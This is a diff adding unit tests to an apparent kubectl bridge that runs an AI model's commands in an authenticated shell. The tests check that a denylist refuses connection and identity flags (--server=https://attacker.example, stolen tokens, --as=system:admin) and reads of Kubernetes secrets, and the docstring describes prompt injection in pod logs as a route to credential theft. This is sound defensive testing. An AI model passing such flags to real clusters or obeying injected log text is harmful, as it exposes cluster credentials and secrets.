@@ -36,6 +36,7 @@ of an all-compliant runbook sequentially through the bridge.
 import json
 import os
 import sys
+import tempfile
 import threading
 import time
 import unittest
@@ -65,6 +66,111 @@ class ValidationTests(unittest.TestCase):
     def test_accepts_plain_readonly_args(self):
         err = mcp._validate_args("get", ["pods", "-n", "raas-preprod", "-o", "wide"])
         self.assertIsNone(err)
+
+
+class ConnectionAndIdentityFlagTests(unittest.TestCase):
+    """S2 (review security finding): the verb allowlist said what kubectl may
+    DO and nothing about WHERE or AS WHOM.
+
+    Every case below passed `_validate_args` before the fix - measured, all
+    eight of the report's shapes returned `None`. The command is typed into
+    the captain's already-authenticated bastion shell, so `--server` plus
+    `--insecure-skip-tls-verify` is a credential exfiltration primitive that
+    a prompt injection in pod logs can reach.
+    """
+
+    DANGEROUS = [
+        ["pods", "--server=https://attacker.example"],
+        ["pods", "--server", "https://attacker.example"],
+        ["pods", "-s", "https://attacker.example"],
+        ["pods", "--kubeconfig=/tmp/evil.yaml"],
+        ["pods", "--token=eyJhbGciOi"],
+        ["pods", "--token", "eyJhbGciOi"],
+        ["pods", "--insecure-skip-tls-verify"],
+        ["pods", "--as=system:admin"],
+        ["pods", "--as-group=system:masters"],
+        ["pods", "--as-uid=0"],
+        ["pods", "--certificate-authority=/tmp/ca.crt"],
+        ["pods", "--client-certificate=/tmp/c.crt"],
+        ["pods", "--client-key=/tmp/c.key"],
+        ["pods", "--tls-server-name=attacker.example"],
+        ["pods", "--username=admin"],
+        ["pods", "--password=hunter2"],
+    ]
+
+    def test_every_dangerous_flag_is_refused(self):
+        for args in self.DANGEROUS:
+            with self.subTest(args=args):
+                err = mcp._validate_args("get", args)
+                self.assertIsNotNone(err, f"{args} was allowed through")
+                self.assertIn("connects or who it authenticates as", err)
+
+    def test_the_flag_is_matched_case_insensitively(self):
+        self.assertIsNotNone(mcp._validate_args("get", ["pods", "--Server=https://x"]))
+
+    def test_ordinary_readonly_flags_still_pass(self):
+        # The discriminating half: a denylist that refused these would be a
+        # check that cannot fail usefully, because the tool would be dead.
+        for args in (
+            ["pods", "-n", "raas-preprod", "-o", "wide"],
+            ["pods", "-l", "app=api"],
+            ["pods", "--all-namespaces"],
+            ["pods", "-o", "jsonpath={.items[*].metadata.name}"],
+            ["deploy/api", "--tail=100"],
+            ["nodes", "--sort-by=.metadata.name"],
+            ["--field-selector=type=Warning"],
+        ):
+            with self.subTest(args=args):
+                self.assertIsNone(mcp._validate_args("get", args))
+
+    def test_a_namespace_that_looks_like_a_flag_is_refused(self):
+        # `namespace` is a separate parameter and never reaches
+        # `_validate_args`, so it needs its own guard - kubectl's own parser
+        # would otherwise take `-n --server=x` as the namespace value and the
+        # shape is one typo away from being read as a flag.
+        out = mcp._run_kubectl("get", ["pods"], "--server=https://attacker.example")
+        self.assertFalse(out["ok"])
+        self.assertIn("may not start with", out["error"])
+
+
+class SecretsResourceTests(unittest.TestCase):
+    """S2's other half: `kubectl get secrets -o yaml` is a read-only verb that
+    puts every secret in the cluster into the model transcript."""
+
+    def test_the_secrets_resource_is_refused_in_every_spelling(self):
+        for args in (
+            ["secrets"],
+            ["secrets", "-o", "yaml"],
+            ["secret"],
+            ["secret/db-password", "-o", "json"],
+            ["secrets/db-password"],
+            ["secrets.v1.", "-o", "json"],
+            ["SECRETS"],
+        ):
+            with self.subTest(args=args):
+                err = mcp._validate_args("get", args)
+                self.assertIsNotNone(err, f"{args} was allowed through")
+                self.assertIn("secrets", err)
+
+    def test_describe_and_logs_are_covered_too(self):
+        self.assertIsNotNone(mcp._validate_args("describe", ["secret/db-password"]))
+
+    def test_a_resource_that_merely_contains_the_word_still_passes(self):
+        # Discriminating power: the check is on the resource head, not a
+        # substring, or `sealedsecrets` and a `-l app=secrets-operator`
+        # selector would both be collateral.
+        self.assertIsNone(mcp._validate_args("get", ["sealedsecrets"]))
+        self.assertIsNone(mcp._validate_args("get", ["pods", "-l", "app=secrets-operator"]))
+
+    def test_a_refused_secrets_read_never_writes_a_request_file(self):
+        with tempfile.TemporaryDirectory() as d:
+            os.environ["SRE_LEAD_BRIDGE_DIR"] = d
+            try:
+                out = mcp._run_kubectl("get", ["secrets", "-o", "yaml"], "")
+                self.assertFalse(out["ok"])
+                self.assertEqual(os.listdir(d), [])
+            finally:
+                os.environ.pop("SRE_LEAD_BRIDGE_DIR", None)
 
 
 class ConfigSubcommandTests(unittest.TestCase):
